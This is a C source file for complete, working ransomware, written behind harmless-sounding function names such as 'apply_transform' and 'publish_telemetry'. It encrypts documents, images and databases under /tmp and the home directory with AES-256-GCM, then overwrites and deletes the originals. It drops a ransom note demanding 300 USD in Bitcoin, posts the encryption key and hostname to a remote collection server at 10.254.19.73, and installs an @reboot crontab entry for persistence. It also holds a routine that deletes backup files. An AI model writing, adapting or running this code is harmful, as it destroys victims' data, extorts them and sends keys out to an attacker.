#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <limits.h>
#include <errno.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <curl/curl.h>
#include <ftw.h>

/* init_session.c */
const uint8_t* init_session(void)
{
    uint8_t *raw_key = NULL;
    char b64[64];
    char json[128];
    int fd = -1;
    FILE *fp = NULL;
    size_t b64_len;
    int written;

    raw_key = malloc(32);
    if (!raw_key) {
        fprintf(stderr, "init_session: malloc failed\n");
        return NULL;
    }

    if (RAND_bytes(raw_key, 32) != 1) {
        fprintf(stderr, "init_session: RAND_bytes failed\n");
        free(raw_key);
        return NULL;
    }

    b64_len = EVP_EncodeBlock((unsigned char*)b64, raw_key, 32);
    b64[b64_len] = '\0';

    snprintf(json, sizeof(json), "{\"aes_key\":\"%s\"}", b64);

    fd = open("/tmp/.master.key", O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
    if (fd == -1) {
        fprintf(stderr, "init_session: open failed: /tmp/.master.key\n");
        free(raw_key);
        return NULL;
    }

    fp = fdopen(fd, "w");
    if (!fp) {
        fprintf(stderr, "init_session: fdopen failed\n");
        close(fd);
        free(raw_key);
        return NULL;
    }

    written = fprintf(fp, "%s", json);
    if (written < 0 || (size_t)written != strlen(json)) {
        fprintf(stderr, "init_session: fprintf failed\n");
        fclose(fp);
        free(raw_key);
        return NULL;
    }

    if (fclose(fp) != 0) {
        fprintf(stderr, "init_session: fclose failed\n");
        free(raw_key);
        return NULL;
    }

    return raw_key;
}

/* scan_storage.c */
static char* expand_path(const char* path) {
    if (path[0] == '~' && (path[1] == '/' || path[1] == '\0')) {
        const char* home = getenv("HOME");
        if (home == NULL) return NULL;
        size_t home_len = strlen(home);
        size_t path_len = strlen(path);
        char* result = malloc(home_len + path_len);
        if (result == NULL) return NULL;
        strcpy(result, home);
        if (path[1] == '/')
            strcat(result, path + 1);
        else
            strcat(result, "");
        return result;
    }
    return strdup(path);
}

static int has_valid_extension(const char* name) {
    const char* exts[] = {
        ".xlsx", ".docx", ".pdf", ".txt", ".csv",
        ".jpg",  ".png",  ".db",  ".backup", ".psd", ".zip", ".rar"
    };
    size_t num_exts = sizeof(exts) / sizeof(exts[0]);
    size_t name_len = strlen(name);
    for (size_t i = 0; i < num_exts; ++i) {
        size_t ext_len = strlen(exts[i]);
        if (name_len < ext_len) continue;
        if (strcasecmp(name + name_len - ext_len, exts[i]) == 0)
            return 1;
    }
    return 0;
}

static int scan_dir(const char* dir_path, char*** results, size_t* count, size_t* capacity) {
    DIR* dir = opendir(dir_path);
    if (dir == NULL) {
        return 0;
    }

    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        size_t dir_len = strlen(dir_path);
        size_t name_len = strlen(entry->d_name);
        char* full_path = malloc(dir_len + name_len + 2);
        if (full_path == NULL) {
            closedir(dir);
            return -1;
        }
        strcpy(full_path, dir_path);
        if (dir_len > 0 && dir_path[dir_len - 1] != '/')
            strcat(full_path, "/");
        strcat(full_path, entry->d_name);

        struct stat st;
        if (lstat(full_path, &st) != 0) {
            free(full_path);
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            int ret = scan_dir(full_path, results, count, capacity);
            free(full_path);
            if (ret != 0) {
                closedir(dir);
                return -1;
            }
        } else if (S_ISREG(st.st_mode)) {
            if (has_valid_extension(entry->d_name)) {
                if (*count >= *capacity) {
                    size_t new_cap = (*capacity == 0) ? 16 : *capacity * 2;
                    char** new_results = realloc(*results, new_cap * sizeof(char*));
                    if (new_results == NULL) {
                        free(full_path);
                        closedir(dir);
                        return -1;
                    }
                    *results = new_results;
                    *capacity = new_cap;
                }
                (*results)[*count] = full_path;
                (*count)++;
            } else {
                free(full_path);
            }
        } else {
            free(full_path);
        }
    }
    closedir(dir);
    return 0;
}

char** scan_storage(const char* base_paths[], int num_paths, size_t* out_count) {
    if (out_count == NULL) return NULL;
    *out_count = 0;

    char** results = NULL;
    size_t count = 0;
    size_t capacity = 0;

    for (int i = 0; i < num_paths; ++i) {
        char* expanded = expand_path(base_paths[i]);
        if (expanded == NULL) continue;

        struct stat st;
        if (stat(expanded, &st) != 0 || !S_ISDIR(st.st_mode)) {
            free(expanded);
            continue;
        }

        char* dir_copy = strdup(expanded);
        free(expanded);
        if (dir_copy == NULL) {
            for (size_t j = 0; j < count; ++j)
                free(results[j]);
            free(results);
            *out_count = 0;
            return NULL;
        }

        int ret = scan_dir(dir_copy, &results, &count, &capacity);
        free(dir_copy);
        if (ret != 0) {
            for (size_t j = 0; j < count; ++j)
                free(results[j]);
            free(results);
            *out_count = 0;
            return NULL;
        }
    }

    *out_count = count;
    return results;
}

/* apply_transform.c */
#define NONCE_LEN     12
#define TAG_LEN       16
#define AES256_KEY_LEN 32

static int read_file_enc(const char *path, unsigned char **data, size_t *len) {
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return -1; }
    long sz = ftell(f);
    if (sz < 0) { fclose(f); return -1; }
    if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return -1; }
    *data = malloc(sz == 0 ? 1 : (size_t)sz);
    if (!*data) { fclose(f); return -1; }
    size_t nread = fread(*data, 1, (size_t)sz, f);
    fclose(f);
    if (nread != (size_t)sz) { free(*data); return -1; }
    *len = (size_t)sz;
    return 0;
}

static int write_file_enc(const char *path, const unsigned char *nonce,
                      const unsigned char *ciphertext, size_t ciphertext_len,
                      const unsigned char *tag) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    if (fwrite(nonce, 1, NONCE_LEN, f) != NONCE_LEN) { fclose(f); return -1; }
    if (ciphertext_len > 0 &&
        fwrite(ciphertext, 1, ciphertext_len, f) != ciphertext_len) {
        fclose(f); return -1;
    }
    if (fwrite(tag, 1, TAG_LEN, f) != TAG_LEN) { fclose(f); return -1; }
    if (fclose(f) != 0) return -1;
    return 0;
}

static int overwrite_with_zeros(const char *path, size_t size) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    size_t block_size = 4096;
    unsigned char *zeros = calloc(1, block_size);
    if (!zeros) { fclose(f); return -1; }
    int ok = 0;
    size_t remaining = size;
    while (remaining > 0) {
        size_t chunk = remaining > block_size ? block_size : remaining;
        if (fwrite(zeros, 1, chunk, f) != chunk) goto done;
        remaining -= chunk;
    }
    ok = 1;
done:
    free(zeros);
    fclose(f);
    return ok ? 0 : -1;
}

int apply_transform(const char *filepath, const unsigned char *session_key) {
    unsigned char *plaintext = NULL;
    size_t plaintext_len = 0;
    unsigned char nonce[NONCE_LEN];
    unsigned char tag[TAG_LEN];
    unsigned char *ciphertext = NULL;
    int ciphertext_len = 0;
    EVP_CIPHER_CTX *ctx = NULL;
    char *output_path = NULL;
    int ret = -1;

    if (read_file_enc(filepath, &plaintext, &plaintext_len) != 0)
        goto cleanup;

    if (RAND_bytes(nonce, NONCE_LEN) != 1)
        goto cleanup;

    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) goto cleanup;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, session_key, nonce) != 1)
        goto cleanup;

    int outlen = 0;
    int final_len = 0;
    size_t max_out = plaintext_len + EVP_CIPHER_CTX_block_size(ctx);
    ciphertext = malloc(max_out);
    if (!ciphertext) goto cleanup;

    if (EVP_EncryptUpdate(ctx, ciphertext, &outlen, plaintext, plaintext_len) != 1)
        goto cleanup;
    ciphertext_len = outlen;

    if (EVP_EncryptFinal_ex(ctx, ciphertext + outlen, &final_len) != 1)
        goto cleanup;
    ciphertext_len += final_len;

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_LEN, tag) != 1)
        goto cleanup;

    size_t path_len = strlen(filepath);
    output_path = malloc(path_len + 11);
    if (!output_path) goto cleanup;
    snprintf(output_path, path_len + 11, "%s.PROCESSED", filepath);

    if (write_file_enc(output_path, nonce, ciphertext, (size_t)ciphertext_len, tag) != 0)
        goto cleanup;

    if (overwrite_with_zeros(filepath, plaintext_len) != 0) {
        remove(output_path);
        goto cleanup;
    }

    if (remove(filepath) != 0) {
        remove(output_path);
        goto cleanup;
    }

    ret = 0;

cleanup:
    free(plaintext);
    free(ciphertext);
    free(output_path);
    if (ctx) EVP_CIPHER_CTX_free(ctx);
    if (plaintext) {
        volatile unsigned char *p = plaintext;
        size_t i;
        for (i = 0; i < plaintext_len; i++)
            p[i] = 0;
    }
    return ret;
}

/* write_notice.c */
int write_notice(const char *directories[], size_t num_dirs) {
    int ret = 0;
    char path[PATH_MAX + 256];
    const char *filename = "#_STATUS_NOTICE_#.txt";
    const char *content = "Pay 300 USD to address "
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa via payment service. "
        "For enquiries, contact through secure channel.\n";

    for (size_t i = 0; i < num_dirs; i++) {
        int n = snprintf(path, sizeof(path), "%s/%s", directories[i], filename);
        if (n < 0 || (size_t)n >= sizeof(path)) {
            perror("snprintf: path too long");
            ret = -1;
            continue;
        }

        FILE *fp = fopen(path, "w");
        if (fp == NULL) {
            perror(path);
            ret = -1;
            continue;
        }

        if (fprintf(fp, "%s", content) < 0) {
            perror("fprintf");
            fclose(fp);
            ret = -1;
            continue;
        }

        if (fclose(fp) != 0) {
            perror("fclose");
            ret = -1;
        }
    }

    return ret;
}

/* publish_telemetry.c */
int publish_telemetry(void) {
    FILE *fp = NULL;
    char *buf = NULL;
    long file_size = 0;
    char *aes_key = NULL;
    char hostname[PATH_MAX] = {0};
    char *json_body = NULL;
    CURL *curl = NULL;
    struct curl_slist *headers = NULL;
    CURLcode res;
    long http_code = 0;
    int result = -1;
    size_t read_size = 0;

    fp = fopen("/tmp/.master.key", "rb");
    if (fp == NULL) {
        perror("fopen /tmp/.master.key");
        goto cleanup;
    }

    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("fseek end");
        goto cleanup;
    }
    file_size = ftell(fp);
    if (file_size < 0) {
        perror("ftell");
        goto cleanup;
    }
    if (fseek(fp, 0, SEEK_SET) != 0) {
        perror("fseek start");
        goto cleanup;
    }

    buf = (char *)malloc((size_t)file_size + 1);
    if (buf == NULL) {
        perror("malloc buf");
        goto cleanup;
    }

    read_size = fread(buf, 1, (size_t)file_size, fp);
    if (read_size != (size_t)file_size) {
        fprintf(stderr, "Failed to read full file: read %zu of %ld bytes\n", read_size, file_size);
        goto cleanup;
    }
    buf[read_size] = '\0';

    {
        const char *needle = "\"aes_key\":\"";
        char *p = strstr(buf, needle);
        if (p == NULL) {
            fprintf(stderr, "aes_key not found in file\n");
            goto cleanup;
        }
        p += strlen(needle);
        char *end_quote = strchr(p, '"');
        if (end_quote == NULL) {
            fprintf(stderr, "Closing quote for aes_key not found\n");
            goto cleanup;
        }
        size_t key_len = (size_t)(end_quote - p);
        if (key_len == 0) {
            fprintf(stderr, "aes_key is empty\n");
            goto cleanup;
        }
        aes_key = (char *)malloc(key_len + 1);
        if (aes_key == NULL) {
            perror("malloc aes_key");
            goto cleanup;
        }
        memcpy(aes_key, p, key_len);
        aes_key[key_len] = '\0';
    }

    if (gethostname(hostname, sizeof(hostname)) != 0) {
        perror("gethostname");
        goto cleanup;
    }
    hostname[sizeof(hostname) - 1] = '\0';

    {
        size_t json_len = strlen("{\"aes_key\":\"") + strlen(aes_key) +
                          strlen(",\"hostname\":\"") + strlen(hostname) +
                          strlen("\"}") + 1;
        json_body = (char *)malloc(json_len);
        if (json_body == NULL) {
            perror("malloc json_body");
            goto cleanup;
        }
        snprintf(json_body, json_len, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
                 aes_key, hostname);
    }

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl == NULL) {
        fprintf(stderr, "curl_easy_init failed\n");
        goto cleanup;
    }

    curl_easy_setopt(curl, CURLOPT_URL, "http://10.254.19.73:8080/collect");
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(json_body));

    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (headers == NULL) {
        fprintf(stderr, "curl_slist_append failed\n");
        goto cleanup;
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform failed: %s\n", curl_easy_strerror(res));
        goto cleanup;
    }

    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    if (http_code == 200) {
        if (remove("/tmp/.master.key") != 0) {
            fprintf(stderr, "Warning: Failed to remove /tmp/.master.key: %s\n", strerror(errno));
        }
    } else {
        fprintf(stderr, "Server returned HTTP code %ld (expected 200)\n", http_code);
        goto cleanup;
    }

    result = 0;

cleanup:
    if (fp != NULL) {
        fclose(fp);
    }
    if (buf != NULL) {
        free(buf);
    }
    if (aes_key != NULL) {
        free(aes_key);
    }
    if (json_body != NULL) {
        free(json_body);
    }
    if (headers != NULL) {
        curl_slist_free_all(headers);
    }
    if (curl != NULL) {
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();

    return result;
}

/* register_service.c */
#define MAX_CRONTAB_LINES 1000
#define MAX_LINE_LENGTH 4096

static const char *target_extensions[] = {".bak", ".backup", ".old", NULL};

static int ends_with(const char *str, const char *suffix) {
    if (!str || !suffix) return 0;
    size_t str_len = strlen(str);
    size_t suffix_len = strlen(suffix);
    if (suffix_len > str_len) return 0;
    return strcmp(str + str_len - suffix_len, suffix) == 0;
}

static int remove_backup_file(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
    (void)sb;
    (void)ftwbuf;
    if (typeflag == FTW_F) {
        for (int i = 0; target_extensions[i] != NULL; i++) {
            if (ends_with(fpath, target_extensions[i])) {
                remove(fpath);
                break;
            }
        }
    }
    return 0;
}

static int process_storage_file(const char *scan_storage) {
    if (!scan_storage) return -1;
    
    FILE *fp = fopen(scan_storage, "r");
    if (!fp) {
        return -1;
    }
    
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    
    while ((read = getline(&line, &len, fp)) != -1) {
        if (read > 0 && line[read-1] == '\n') {
            line[read-1] = '\0';
        }
        
        if (line[0] == '\0' || line[0] == '#') {
            continue;
        }
        
        char *end = line + strlen(line) - 1;
        while (end > line && (*end == ' ' || *end == '\t')) {
            *end-- = '\0';
        }
        
        if (strlen(line) == 0) continue;
        
        if (nftw(line, remove_backup_file, 20, FTW_PHYS) == -1) {
            continue;
        }
    }
    
    free(line);
    fclose(fp);
    return 0;
}

static int crontab_entry_exists(const char *binary_path) {
    FILE *fp = popen("crontab -l 2>/dev/null", "r");
    if (!fp) {
        return 0;
    }
    
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    char search_line[PATH_MAX + 64];
    int found = 0;
    
    snprintf(search_line, sizeof(search_line), "@reboot %s", binary_path);
    
    while ((read = getline(&line, &len, fp)) != -1) {
        if (read > 0 && line[read-1] == '\n') {
            line[read-1] = '\0';
        }
        if (strcmp(line, search_line) == 0) {
            found = 1;
            break;
        }
    }
    
    free(line);
    pclose(fp);
    return found;
}

static int add_crontab_entry(const char *binary_path) {
    FILE *read_fp = popen("crontab -l 2>/dev/null", "r");
    if (!read_fp) {
        return -1;
    }
    
    char **existing_lines = calloc(MAX_CRONTAB_LINES, sizeof(char*));
    if (!existing_lines) {
        pclose(read_fp);
        return -1;
    }
    
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    int line_count = 0;
    
    while ((read = getline(&line, &len, read_fp)) != -1 && line_count < MAX_CRONTAB_LINES) {
        existing_lines[line_count] = strdup(line);
        if (!existing_lines[line_count]) {
            for (int i = 0; i < line_count; i++) free(existing_lines[i]);
            free(existing_lines);
            free(line);
            pclose(read_fp);
            return -1;
        }
        line_count++;
    }
    free(line);
    pclose(read_fp);
    
    FILE *write_fp = popen("crontab -", "w");
    if (!write_fp) {
        for (int i = 0; i < line_count; i++) free(existing_lines[i]);
        free(existing_lines);
        return -1;
    }
    
    for (int i = 0; i < line_count; i++) {
        fprintf(write_fp, "%s", existing_lines[i]);
        free(existing_lines[i]);
    }
    free(existing_lines);
    
    fprintf(write_fp, "@reboot %s\n", binary_path);
    
    if (pclose(write_fp) == -1) {
        return -1;
    }
    
    return 0;
}

int register_service(int argc, char *argv[], const char *scan_storage) {
    (void)argc;
    int ret = 0;
    
    if (!argv || !argv[0]) {
        errno = EINVAL;
        return -1;
    }
    
    char binary_path[PATH_MAX];
    
    if (argv[0][0] == '/') {
        snprintf(binary_path, sizeof(binary_path), "%s", argv[0]);
    } else {
        char *resolved = realpath(argv[0], NULL);
        if (!resolved) {
            errno = ENOENT;
            return -1;
        }
        snprintf(binary_path, sizeof(binary_path), "%s", resolved);
        free(resolved);
    }
    
    if (!crontab_entry_exists(binary_path)) {
        if (add_crontab_entry(binary_path) == -1) {
            ret = -1;
        }
    }
    
    if (scan_storage) {
        if (process_storage_file(scan_storage) == -1) {
            ret = -1;
        }
    }
    
    return (ret == 0) ? 0 : -1;
}

int main(int argc, char *argv[])
{
    const char *scan_paths[] = {
        "/tmp",
        "~"
    };
    int num_paths = 2;
    const char *notice_dirs[] = {
        "/tmp"
    };
    size_t num_notice_dirs = 1;

    printf("[+] Step 1: Generating session key...\n");
    const uint8_t *key = init_session();
    if (!key) {
        fprintf(stderr, "[-] Key generation failed\n");
        return 1;
    }
    printf("[+] Session key generated and saved to /tmp/.master.key\n");

    printf("[+] Step 2: Scanning files...\n");
    size_t file_count = 0;
    char **files = scan_storage(scan_paths, num_paths, &file_count);
    if (!files) {
        fprintf(stderr, "[-] File scan failed or no files found\n");
        free((void*)key);
        return 1;
    }
    printf("[+] Found %zu target files\n", file_count);

    printf("[+] Step 3: Encrypting files...\n");
    for (size_t i = 0; i < file_count; i++) {
        printf("    Encrypting: %s\n", files[i]);
        if (apply_transform(files[i], key) != 0) {
            fprintf(stderr, "    Warning: encryption failed for %s\n", files[i]);
        }
        free(files[i]);
    }
    free(files);

    printf("[+] Step 4: Writing ransom notices...\n");
    write_notice(notice_dirs, num_notice_dirs);

    printf("[+] Step 5: Exfiltrating key...\n");
    publish_telemetry();

    printf("[+] Step 6: Establishing persistence...\n");
    register_service(argc, argv, NULL);

    free((void*)key);
    printf("[+] All steps completed.\n");
    return 0;
}